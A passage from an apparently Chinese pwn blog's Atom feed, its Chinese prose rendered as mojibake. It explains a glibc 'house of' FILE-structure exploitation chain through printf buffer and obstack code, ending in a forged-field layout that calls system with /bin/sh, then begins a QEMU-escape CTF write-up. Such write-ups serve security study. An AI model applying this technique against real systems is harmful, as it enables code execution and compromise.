class="keyword">int</span></span><br><span class="line">__printf_buffer_as_file_overflow (FILE *fp, <span class="keyword">int</span> ch)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> __<span class="title">printf_buffer_as_file</span> *<span class="title">file</span> =</span> (struct __printf_buffer_as_file *) fp;</span><br><span class="line"></span><br><span class="line">  __printf_buffer_as_file_commit (file);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* EOF means only a flush is requested.   */</span></span><br><span class="line">  <span class="keyword">if</span> (ch != EOF)</span><br><span class="line">    __printf_buffer_putc (file-&gt;next, ch);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Ensure that flushing actually produces room.  */</span></span><br><span class="line">  <span class="keyword">if</span> (!__printf_buffer_has_failed (file-&gt;next)</span><br><span class="line">      &amp;&amp; file-&gt;next-&gt;write_ptr == file-&gt;next-&gt;write_end)</span><br><span class="line">    __printf_buffer_flush (file-&gt;next);</span><br><span class="line"></span><br><span class="line">  __printf_buffer_as_file_switch_to_buffer (file);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!__printf_buffer_has_failed (file-&gt;next))</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">char</span>) ch;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå‡½æ•°ä¸€æ¥å°±æ˜¯ä¸€ä¸ªå¼ºåˆ¶ç±»å‹è½¬åŒ–ä¸º<code>__printf_buffer_as_file</code>ç»“æ„ä½“ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">printf_buffer_as_file</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* Interface to libio.  */</span></span><br><span class="line">  FILE stream;</span><br><span class="line">  <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Pointer to the underlying buffer.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> __<span class="title">printf_buffer</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è¿™ä¸ªç»“æ„ä½“çš„å‰é¢ä¸¤ä¸ªæˆå‘˜å…¶å®å°±ç›¸å½“äº<code>_IO_FILE_plus</code>ç»“æ„ä½“ï¼Œå†åœ¨åé¢è·Ÿäº†ä¸€ä¸ªæŒ‡é’ˆã€‚</p><p>è¿™ä¸ªå‡½æ•°çš„ç›®æ ‡æ˜¯æ‰§è¡Œåˆ°<code>__printf_buffer_flush</code>ï¼Œæ‰€ä»¥éœ€è¦é€šè¿‡å‰é¢çš„éªŒè¯ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">__printf_buffer_as_file_commit (struct __printf_buffer_as_file *file)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Check that the write pointers in the file stream are consistent</span></span><br><span class="line"><span class="comment">     with the next buffer.  */</span></span><br><span class="line">  assert (file-&gt;stream._IO_write_ptr &gt;= file-&gt;next-&gt;write_ptr);</span><br><span class="line">  assert (file-&gt;stream._IO_write_ptr &lt;= file-&gt;next-&gt;write_end);</span><br><span class="line">  assert (file-&gt;stream._IO_write_base == file-&gt;next-&gt;write_base);</span><br><span class="line">  assert (file-&gt;stream._IO_write_end == file-&gt;next-&gt;write_end);</span><br><span class="line"> </span><br><span class="line">  file-&gt;next-&gt;write_ptr = file-&gt;stream._IO_write_ptr;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span></span><br><span class="line">__printf_buffer_putc (struct __printf_buffer *buf, <span class="keyword">char</span> ch)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (buf-&gt;write_ptr != buf-&gt;write_end)</span><br><span class="line">      *buf-&gt;write_ptr++ = ch;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    __printf_buffer_putc_1 (buf, ch);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œç¬¬ä¸€ä¸ªå‡½æ•°ä¸­å°±æ˜¯éªŒè¯äº†nextæŒ‡é’ˆçš„å†…å®¹ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">printf_buffer</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">char</span> *write_base;</span><br><span class="line">  <span class="keyword">char</span> *write_ptr;</span><br><span class="line">  <span class="keyword">char</span> *write_end;</span><br><span class="line">  <span class="keyword">uint64_t</span> written;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Identifies the flush callback.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">enum</span> __<span class="title">printf_buffer_mode</span> <span class="title">mode</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>æˆåŠŸç»•è¿‡ä¸Šé¢çš„åˆ¤æ–­ä¹‹åè¿›å…¥ä¸‹é¢è¿™ä¸ªå‡½æ•°:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">__printf_buffer_do_flush (struct __printf_buffer *buf)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">switch</span> (buf-&gt;mode)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> __printf_buffer_mode_failed:</span><br><span class="line">    <span class="keyword">case</span> __printf_buffer_mode_sprintf:</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">case</span> __printf_buffer_mode_snprintf:</span><br><span class="line">      __printf_buffer_flush_snprintf ((struct __printf_buffer_snprintf *) buf);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">case</span> __printf_buffer_mode_sprintf_chk:</span><br><span class="line">      __chk_fail ();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> __printf_buffer_mode_to_file:</span><br><span class="line">      __printf_buffer_flush_to_file ((struct __printf_buffer_to_file *) buf);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">case</span> __printf_buffer_mode_asprintf:</span><br><span class="line">      __printf_buffer_flush_asprintf ((struct __printf_buffer_asprintf *) buf);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">case</span> __printf_buffer_mode_dprintf:</span><br><span class="line">      __printf_buffer_flush_dprintf ((struct __printf_buffer_dprintf *) buf);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">case</span> __printf_buffer_mode_strfmon:</span><br><span class="line">      __set_errno (E2BIG);</span><br><span class="line">      __printf_buffer_mark_failed (buf);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">case</span> __printf_buffer_mode_fp:</span><br><span class="line">      __printf_buffer_flush_fp ((struct __printf_buffer_fp *) buf);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">case</span> __printf_buffer_mode_fp_to_wide:</span><br><span class="line">      __printf_buffer_flush_fp_to_wide</span><br><span class="line">        ((struct __printf_buffer_fp_to_wide *) buf);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">case</span> __printf_buffer_mode_fphex_to_wide:</span><br><span class="line">      __printf_buffer_flush_fphex_to_wide</span><br><span class="line">        ((struct __printf_buffer_fphex_to_wide *) buf);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">case</span> __printf_buffer_mode_obstack:</span><br><span class="line">      __printf_buffer_flush_obstack ((struct __printf_buffer_obstack *) buf);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  __builtin_trap ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæœ€ç»ˆç›®æ ‡æ˜¯<code>__printf_buffer_flush_obstack</code>å‡½æ•°ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">__printf_buffer_flush_obstack (struct __printf_buffer_obstack *buf)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* About to switch buffers, so record the bytes written so far.  */</span></span><br><span class="line">  buf-&gt;base.written += buf-&gt;base.write_ptr - buf-&gt;base.write_base;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (buf-&gt;base.write_ptr == &amp;buf-&gt;ch + <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Errors are reported via a callback mechanism (presumably for</span></span><br><span class="line"><span class="comment"> process termination).  */</span></span><br><span class="line">      obstack_1grow (buf-&gt;obstack, buf-&gt;ch);</span><br><span class="line">      buf-&gt;base.write_base = obstack_next_free (buf-&gt;obstack);</span><br><span class="line">      buf-&gt;base.write_ptr = buf-&gt;base.write_base;</span><br><span class="line">      <span class="keyword">size_t</span> size = obstack_room (buf-&gt;obstack);</span><br><span class="line">      buf-&gt;base.write_end = buf-&gt;base.write_ptr + size;</span><br><span class="line">      <span class="comment">/* Reserve the space on the obstack size.  */</span></span><br><span class="line">      obstack_blank_fast (buf-&gt;obstack, size);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Obtain the extra character.  */</span></span><br><span class="line">      buf-&gt;base.write_base = &amp;buf-&gt;ch;</span><br><span class="line">      buf-&gt;base.write_ptr = &amp;buf-&gt;ch;</span><br><span class="line">      buf-&gt;base.write_end = &amp;buf-&gt;ch + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå‡½æ•°çš„ç›®æ ‡å°±æ˜¯<code>obstack_1grow</code>ï¼Œå‰é¢çš„ç»•è¿‡æ–¹å¼å¾ˆç®€å•ï¼Œç›´æ¥ç»•è¿‡å°±è¡Œã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">define</span> obstack_1grow(OBSTACK, datum)      \</span></span><br><span class="line"><span class="meta">  __extension__      \</span></span><br><span class="line"><span class="meta">    (&#123; struct obstack *__o = (OBSTACK);      \</span></span><br><span class="line"><span class="meta">       <span class="meta-keyword">if</span> (__o-&gt;next_free + 1 &gt; __o-&gt;chunk_limit)      \</span></span><br><span class="line"><span class="meta"> _obstack_newchunk (__o, 1);      \</span></span><br><span class="line"><span class="meta">       obstack_1grow_fast (__o, datum);      \</span></span><br><span class="line"><span class="meta">       (void) 0; &#125;)</span></span><br></pre></td></tr></table></figure><p>ç„¶åæ‰§è¡Œè¿™ä¸ªå®ï¼Œå®ä¸­å°±æœ‰äº†æˆ‘ä»¬ç†Ÿæ‚‰çš„<code>_obstack_newchunk</code>å‡½æ•°äº†ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">_obstack_newchunk (struct obstack *h, <span class="keyword">int</span> length)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">obstack_chunk</span> *<span class="title">old_chunk</span> =</span> h-&gt;chunk;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">obstack_chunk</span> *<span class="title">new_chunk</span>;</span></span><br><span class="line">  <span class="keyword">long</span> new_size;</span><br><span class="line">  <span class="keyword">long</span> obj_size = h-&gt;next_free - h-&gt;object_base;</span><br><span class="line">  <span class="keyword">long</span> i;</span><br><span class="line">  <span class="keyword">long</span> already;</span><br><span class="line">  <span class="keyword">char</span> *object_base;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Compute size for new chunk.  */</span></span><br><span class="line">  new_size = (obj_size + length) + (obj_size &gt;&gt; <span class="number">3</span>) + h-&gt;alignment_mask + <span class="number">100</span>;</span><br><span class="line">  <span class="keyword">if</span> (new_size &lt; h-&gt;chunk_size)</span><br><span class="line">    new_size = h-&gt;chunk_size;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Allocate and initialize the new chunk.  */</span></span><br><span class="line">  new_chunk = CALL_CHUNKFUN (h, new_size);</span><br><span class="line">  <span class="keyword">if</span> (!new_chunk)</span><br><span class="line">    (*obstack_alloc_failed_handler)();</span><br><span class="line">  h-&gt;chunk = new_chunk;</span><br><span class="line">  new_chunk-&gt;prev = old_chunk;</span><br><span class="line">  new_chunk-&gt;limit = h-&gt;chunk_limit = (<span class="keyword">char</span> *) new_chunk + new_size;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Compute an aligned object_base in the new chunk */</span></span><br><span class="line">  object_base =</span><br><span class="line">    __PTR_ALIGN ((<span class="keyword">char</span> *) new_chunk, new_chunk-&gt;contents, h-&gt;alignment_mask);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Move the existing object to the new chunk.</span></span><br><span class="line"><span class="comment">     Word at a time is fast and is safe if the object</span></span><br><span class="line"><span class="comment">     is sufficiently aligned.  */</span></span><br><span class="line">  <span class="keyword">if</span> (h-&gt;alignment_mask + <span class="number">1</span> &gt;= DEFAULT_ALIGNMENT)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">for</span> (i = obj_size / <span class="keyword">sizeof</span> (COPYING_UNIT) - <span class="number">1</span>;</span><br><span class="line">   i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">((COPYING_UNIT *) object_base)[i]</span><br><span class="line">  = ((COPYING_UNIT *) h-&gt;object_base)[i];</span><br><span class="line">      <span class="comment">/* We used to copy the odd few remaining bytes as one extra COPYING_UNIT,</span></span><br><span class="line"><span class="comment"> but that can cross a page boundary on a machine</span></span><br><span class="line"><span class="comment"> which does not do strict alignment for COPYING_UNITS.  */</span></span><br><span class="line">      already = obj_size / <span class="keyword">sizeof</span> (COPYING_UNIT) * <span class="keyword">sizeof</span> (COPYING_UNIT);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    already = <span class="number">0</span>;</span><br><span class="line">  <span class="comment">/* Copy remaining bytes one by one.  */</span></span><br><span class="line">  <span class="keyword">for</span> (i = already; i &lt; obj_size; i++)</span><br><span class="line">    object_base[i] = h-&gt;object_base[i];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* If the object just copied was the only data in OLD_CHUNK,</span></span><br><span class="line"><span class="comment">     free that chunk and remove it from the chain.</span></span><br><span class="line"><span class="comment">     But not if that chunk might contain an empty object.  */</span></span><br><span class="line">  <span class="keyword">if</span> (!h-&gt;maybe_empty_object</span><br><span class="line">      &amp;&amp; (h-&gt;object_base</span><br><span class="line">  == __PTR_ALIGN ((<span class="keyword">char</span> *) old_chunk, old_chunk-&gt;contents,</span><br><span class="line">  h-&gt;alignment_mask)))</span><br><span class="line">    &#123;</span><br><span class="line">      new_chunk-&gt;prev = old_chunk-&gt;prev;</span><br><span class="line">      CALL_FREEFUN (h, old_chunk);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  h-&gt;object_base = object_base;</span><br><span class="line">  h-&gt;next_free = h-&gt;object_base + obj_size;</span><br><span class="line">  <span class="comment">/* The new chunk certainly contains no empty object yet.  */</span></span><br><span class="line">  h-&gt;maybe_empty_object = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œåˆå¯ä»¥çœ‹åˆ°æˆ‘ä»¬ç†Ÿæ‚‰çš„å®<code>CALL_CHUNKFUN</code>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">define</span> CALL_CHUNKFUN(h, size) \</span></span><br><span class="line"><span class="meta">  (((h)-&gt;use_extra_arg)      \</span></span><br><span class="line"><span class="meta">   ? (*(h)-&gt;chunkfun)((h)-&gt;extra_arg, (size))      \</span></span><br><span class="line"><span class="meta">   : (*(struct _obstack_chunk *(*)(long))(h)-&gt;chunkfun)((size)))</span></span><br></pre></td></tr></table></figure><p>å½“<code>(h)-&gt;use_extra_arg</code>ä¸ä¸º0æ—¶å³å¯æ‰§è¡Œåˆ°<code>(h)-&gt;chunkfun</code>ã€‚ç°åœ¨å°±æ˜¯æ•´æ¡é“¾å­çš„è°ƒç”¨äº†ã€‚</p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>è¿™é‡Œæ²¡æœ‰ä¸€ç‚¹ä¸€ç‚¹åˆ†ææ¯ä¸ªifè¯­å¥åº”è¯¥æ€ä¹ˆå†™ï¼Œè¿™é‡Œç›´æ¥ç»™å‡ºæ€»çš„å°±è¡Œã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">*(A + <span class="number">0x20</span>) = <span class="number">0</span>;</span><br><span class="line">*(A + <span class="number">0x28</span>) = A + <span class="number">0x119</span>;</span><br><span class="line">*(A + <span class="number">0x30</span>) = A + <span class="number">0x119</span>;</span><br><span class="line">*(A + <span class="number">0xd8</span>) = _IO_printf_buffer_as_file_jumps;</span><br><span class="line">*(A + <span class="number">0xe0</span>) = A + <span class="number">0xe8</span>;</span><br><span class="line">*(A + <span class="number">0xe8</span>) = <span class="number">0</span>;</span><br><span class="line">*(A + <span class="number">0xf0</span>) = <span class="number">0</span>;</span><br><span class="line">*(A + <span class="number">0xf8</span>) = A + <span class="number">0x119</span>;</span><br><span class="line">*(A + <span class="number">0x108</span>) = <span class="number">11</span>;</span><br><span class="line">*(A + <span class="number">0x110</span>) = A + <span class="number">0x110</span>;</span><br><span class="line">*(A + <span class="number">0x128</span>) = <span class="number">0</span>;</span><br><span class="line">*(A + <span class="number">0x130</span>) = <span class="number">0</span>;</span><br><span class="line">*(A + <span class="number">0x148</span>) = &amp;system;</span><br><span class="line">*(A + <span class="number">0x158</span>) = &amp;bin_sh;</span><br><span class="line">*(A + <span class="number">0x160</span>) = <span class="number">1</span>;</span><br></pre></td></tr></table></figure><h3 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h3><p>â€‹    <a class="link"   href="https://mp.weixin.qq.com/s?__biz=Mzg4MjcxMTAwMQ==&amp;mid=2247486227&amp;idx=1&amp;sn=3ee610ce260b4a381bd0bcf202a34dec&amp;chksm=cf53cba5f82442b3f750ea969f480f9851793006f9223b04db9c5f7ad67c08a9f8db2661bed3&amp;mpshare=1&amp;scene=23&amp;srcid=03222uDWnBlUHhXPTbaEqKrs&amp;sharer_sharetime=1679449533105&amp;sharer_shareid=6eea79ff6da57fc6752ab0bc570bf392%23rd" >https://mp.weixin.qq.com/s?__biz=Mzg4MjcxMTAwMQ==&amp;mid=2247486227&amp;idx=1&amp;sn=3ee610ce260b4a381bd0bcf202a34dec&amp;chksm=cf53cba5f82442b3f750ea969f480f9851793006f9223b04db9c5f7ad67c08a9f8db2661bed3&amp;mpshare=1&amp;scene=23&amp;srcid=03222uDWnBlUHhXPTbaEqKrs&amp;sharer_sharetime=1679449533105&amp;sharer_shareid=6eea79ff6da57fc6752ab0bc570bf392%23rd<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;è¿™house ofç³»åˆ—æ˜¯çœŸçš„å¤šï¼Œä¸Šä¸€ä¸ªè¿˜æ²¡æ‚çƒ­ä¸‹ä¸€ä¸ªå°±æ¥äº†ï¼Œglibcæ›´æ–°ä¹Ÿæ˜¯çœŸå¿«ã€‚ä¸è¿‡èƒ½åœ¨å­¦ä¹ æ–°ä¸œè¥¿çš„é€”ä¸­æ°´ä¸€ç¯‡æ–‡ç« è¿˜æ˜¯ç›¸å½“ä¸é”™çš„ã€‚&lt;/p&gt;
&lt;h2 id=&quot;èƒŒæ™¯ä»‹ç»&quot;&gt;&lt;a href=&quot;#èƒŒæ™¯ä»‹ç»&quot; class=&quot;headerlink&quot; title=&quot;èƒŒæ™¯ä»‹ç»&quot;&gt;&lt;/a</summary>
      
    
    
    
    <category term="pwn" scheme="https://cv196082.gitee.io/categories/pwn/"/>
    
    
    <category term="house of ç³»åˆ—" scheme="https://cv196082.gitee.io/tags/house-of-%E7%B3%BB%E5%88%97/"/>
    
  </entry>
  
  <entry>
    <title>QEMUé€ƒé€¸ç»ƒä¹ </title>
    <link href="https://cv196082.gitee.io/2023/03/21/QEMU%E9%80%83%E9%80%B8%E7%BB%83%E4%B9%A0/"/>
    <id>https://cv196082.gitee.io/2023/03/21/QEMU%E9%80%83%E9%80%B8%E7%BB%83%E4%B9%A0/</id>
    <published>2023-03-21T07:57:03.000Z</published>
    <updated>2023-03-21T07:58:58.961Z</updated>
    
    <content type="html"><![CDATA[<p>å¯ä»¥çœ‹å¾—å‡ºæ¥è¿™ç¯‡æ–‡ç« çš„æ ‡é¢˜ååˆ†çš„æ°´ï¼Œå› ä¸ºç¡®å®æ˜¯å¾ˆéš¾æ‰¾åˆ°è¿™ä¸¤é“é¢˜åˆä»€ä¹ˆé—ªå…‰ç‚¹æ¥ä½œä¸ºæ ‡é¢˜ã€‚è¿™ç¯‡æ–‡ç« æ›´æ–°åä¼šæš‚åœå­¦ä¹ qemuäº†ï¼Œåç»­ä¼šè¿›ä¸€æ­¥å­¦ä¹ AFLä»¥åŠå¼€å§‹æ¥è§¦dockeré€ƒé€¸ã€‚</p><h2 id="FastCP-ctf"><a href="#FastCP-ctf" class="headerlink" title="FastCP-ctf"></a>FastCP-ctf</h2><p>å…³äºè®¾å¤‡çš„åˆ†æå¯ä»¥å‚è€ƒå‰é¢ä¸¤ç¯‡æ–‡ç« ï¼Œè¿™é‡Œå°±ä¸å†èµ˜è¿°äº†ã€‚</p><h3 id="å‡½æ•°åˆ†æ"><a href="#å‡½æ•°åˆ†æ" class="headerlink" title="å‡½æ•°åˆ†æ"></a>å‡½æ•°åˆ†æ</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">uint64_t</span> __fastcall <span class="title">fastcp_mmio_read</span><span class="params">(FastCPState *opaque, hwaddr addr, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( size != <span class="number">8</span> &amp;&amp; addr &lt;= <span class="number">0x1F</span> || addr &gt; <span class="number">0x1F</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( addr == <span class="number">8</span> )</span><br><span class="line">    <span class="keyword">return</span> opaque-&gt;cp_state.CP_list_src;</span><br><span class="line">  <span class="keyword">if</span> ( addr &lt;= <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !addr )</span><br><span class="line">      <span class="keyword">return</span> opaque-&gt;handling;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( addr != <span class="number">0x10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( addr == <span class="number">0x18</span> )</span><br><span class="line">      <span class="keyword">return</span> opaque-&gt;cp_state.cmd;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> opaque-&gt;cp_state.CP_list_cnt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆå°±æ˜¯readå‡½æ•°è¿™é‡Œæ˜¯éå¸¸å¸¸è§„çš„ä¸€äº›å†…å®¹ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 